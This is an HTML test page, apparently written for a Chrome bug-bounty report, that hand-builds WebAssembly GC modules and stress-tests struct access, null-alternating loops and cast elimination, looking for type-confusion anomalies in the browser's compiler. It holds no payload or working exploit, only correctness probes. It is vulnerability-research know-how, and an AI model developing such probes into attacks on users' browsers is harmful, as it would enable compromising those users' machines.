<!DOCTYPE html>
<html>
<head><title>WasmGC PoC - Chrome 145</title>
<style>
body{font-family:monospace;background:#111;color:#0f0;padding:20px}
.ok{color:#0f0}.err{color:#f00}.info{color:#ff0}
pre{margin:2px 0}
</style>
</head>
<body>
<h2 style="color:#e94560">WasmGC Type Confusion PoC — Chrome VRP</h2>
<pre id="o">Loading...</pre>
<script>
// === WasmGC Binary Builder (identical to wasmgc_builder_test.mjs) ===
function leb128_u(v){const r=[];do{let b=v&0x7f;v>>>=7;if(v)b|=0x80;r.push(b)}while(v);return r}
function leb128_s(v){const r=[];let m=true;while(m){let b=v&0x7f;v>>=7;if((v===0&&!(b&0x40))||(v===-1&&(b&0x40)))m=false;else b|=0x80;r.push(b)}return r}
function section(id,c){return[id,...leb128_u(c.length),...c]}
function vec(items){const f=items.flat();return[...leb128_u(items.length),...f]}
function str(s){const e=new TextEncoder().encode(s);return[...leb128_u(e.length),...e]}

const GC=0xfb,SNEW=0x00,SGET=0x02,RCAST=0x17,RIN=0xd1,RANN=0xd4;
const I32=0x7f,F64=0x7c,ST=0x5f,FT=0x60,SUB=0x50,SUBF=0x4f,REC=0x4e,END=0x0b;

const O = document.getElementById('o');
let out = '';
function log(msg,cls='info'){out+=`<span class="${cls}">${msg}</span>\n`;O.innerHTML=out}

async function run(){
  log(`Chrome: ${navigator.userAgent}`);
  
  // Test 1: struct.new + struct.get
  log('\n=== Test 1: Struct Field Access ===');
  try{
    const b=new Uint8Array([0,97,115,109,1,0,0,0,
      ...section(1,[2,ST,2,I32,1,I32,1,FT,0,1,I32]),
      ...section(3,[1,1]),
      ...section(7,vec([[...str("f"),0,...leb128_u(0)]])),
      ...section(10,vec([[...(()=>{const c=[0,0x41,...leb128_s(42),0x41,...leb128_s(99),GC,SNEW,...leb128_u(0),GC,SGET,...leb128_u(0),...leb128_u(0),END];return[...leb128_u(c.length),...c]})()]]))
    ]);
    const m=new WebAssembly.Module(b);
    const i=await WebAssembly.instantiate(m);
    const r=i.exports.f();
    log(`struct.get: ${r} (expected 42)`,r===42?'ok':'err');
    let ok=true;
    for(let j=0;j<200000;j++)if(i.exports.f()!==42){ok=false;log(`ANOMALY at ${j}`,'err');break}
    log(`200K iterations: ${ok?'ALL CORRECT':'ANOMALY'}`,'ok');
  }catch(e){log('Error: '+e.message,'err')}

  // Test 2: Phi Stress (alternating struct/null in loop)
  log('\n=== Test 2: Phi Stress ===');
  try{
    const body=[
      3,1,0x63,0x00,1,I32,1,I32, // locals: ref null type0, i32, i32
      0x41,0,0x21,2, 0x41,0,0x21,3, // init counter=0, sum=0
      2,0x40, 3,0x40, // block, loop
      0x20,2,0x41,1,0x71, // counter&1
      4,0x40, // if
        0x20,2,GC,SNEW,0, 0x21,1, // struct.new, set ref
      5, // else
        0xd0,0x00, 0x21,1, // ref.null 0, set ref
      0x0b, // end if
      0x20,1,RIN,0x45, // ref.is_null, eqz
      4,0x40, // if (not null)
        0x20,3, 0x20,1,RANN, GC,SGET,0,0, 0x6a, 0x21,3, // sum += get
      0x0b, // end if
      0x20,2,0x41,1,0x6a,0x21,2, // counter++
      0x20,2,0x20,0,0x48,0x0d,0, // br_if loop
      0x0b,0x0b, // end loop, end block
      0x20,3,END // return sum
    ];
    const b=new Uint8Array([0,97,115,109,1,0,0,0,
      ...section(1,[2,ST,1,I32,1,FT,1,I32,1,I32]),
      ...section(3,[1,1]),
      ...section(7,vec([[...str("s"),0,...leb128_u(0)]])),
      ...section(10,vec([[...leb128_u(body.length),...body]]))
    ]);
    const m=new WebAssembly.Module(b);
    const i=await WebAssembly.instantiate(m);
    for(const n of[10,100,1000,10000,100000]){
      const r=i.exports.s(n);
      let e=0;for(let j=0;j<n;j++)if(j&1)e=(e+j)|0;
      log(`n=${n}: ${r===e?'OK':'MISMATCH!'} (got ${r}, exp ${e})`,r===e?'ok':'err');
    }
  }catch(e){log('Error: '+e.message,'err')}

  // Test 3: Cast Elimination (subtyping hierarchy)
  log('\n=== Test 3: Cast Elimination ===');
  try{
    const types=[1,REC,3,
      SUB,0,ST,1,I32,1,           // type0: open struct{i32}
      SUBF,1,0,ST,2,I32,1,F64,1, // type1: final extends 0 struct{i32,f64}
      SUBF,0,FT,1,I32,1,I32      // type2: func(i32)->i32
    ];
    const f64bytes=[...new Uint8Array(new Float64Array([3.14]).buffer)];
    const body=[
      1,1,0x63,0x00, // 1 local: ref null type0
      0x20,0, // local.get param
      0x44,...f64bytes, // f64.const 3.14
      GC,SNEW,...leb128_u(1), // struct.new type1
      0x21,1, // local.set ref
      0x20,1, // local.get ref
      GC,RCAST,...leb128_s(1), // ref.cast heap type 1
      GC,SGET,...leb128_u(1),...leb128_u(0), // struct.get type1 field0
      END
    ];
    const b=new Uint8Array([0,97,115,109,1,0,0,0,
      ...section(1,types),
      ...section(3,[1,...leb128_u(2)]),
      ...section(7,vec([[...str("c"),0,...leb128_u(0)]])),
      ...section(10,vec([[...leb128_u(body.length),...body]]))
    ]);
    const m=new WebAssembly.Module(b);
    const i=await WebAssembly.instantiate(m);
    for(const v of[0,1,42,-1,2147483647]){
      const r=i.exports.c(v);
      log(`cast(${v}): ${r} ${r===v?'OK':'WRONG!'}`,r===v?'ok':'err');
    }
    let a=0;
    for(let j=0;j<500000;j++)if(i.exports.c(j)!==j){a++;if(a<=3)log(`CAST ANOMALY at ${j}`,'err')}
    log(`500K cast iterations: ${a} anomalies`,a===0?'ok':'err');
  }catch(e){log('Error: '+e.message,'err')}

  log('\n=== DONE ===','info');
}
run().catch(e=>log('Fatal: '+e.message,'err'));
</script>
</body>
</html>
